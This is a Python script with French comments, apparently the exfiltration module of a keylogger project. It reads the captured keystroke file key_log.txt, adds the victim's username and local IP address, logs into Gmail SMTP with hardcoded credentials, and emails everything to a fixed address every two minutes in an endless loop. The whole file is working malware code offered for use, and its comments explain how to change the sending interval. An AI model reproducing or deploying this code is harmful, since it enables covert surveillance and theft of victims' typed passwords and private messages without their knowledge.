import time
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket

#recuperer le nom d'utilisateur
USER_NAME = getpass.getuser()

#Initialisation 
fromaddr = "keylogger.projet@gmail.com"

#Adresse email dest :vous allez recevoir le fichier key_log.txt sur cet email
toaddr = "fichiertext@gmail.com"
#Pour voir les fichiers .txt , veuillez utiliser le mot de passe suivant : "python1m"
 
msg = MIMEMultipart()
 
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Bonjour, vous trouverez ci joint le fichier key_log.txt, Bonne journee!"

m = "Nom d'utilisateur %s" % USER_NAME

#message envoye avec le fichier key_log.txt
body = "Fichier envoye avec succes \n Adresse IP %s\n" % [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][0]  
msg.attach(MIMEText(body, 'plain'))
msg.attach(MIMEText(m, 'plain'))

filename = "key_log.txt"
attachment = open(filename, "rb")

#cette fonction permet de recuperer le fichier key_log.txt
# En outre elle permet de rentrer dans le server de gmail via le port 587
# Et envoyer le fichier key_log.txt
def envoi():
        part = MIMEBase('application', 'octet-stream')
        msg.attach(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)   
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, "pythonm1")
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        
#Boucle while qui permet de renvoyer un email chaque 60 secondes
#Appel a la fonction envoi pour l'envoi du mail
# Vous pouvez toujours modifier la duree dans sleep()
# par exemple, si vous voulez mettre 90 secondes , il suffit juste de
#supprimer 120 et la remplacer par 90 : time.sleep(90)
while 1:
        time.sleep(120)
        envoi()













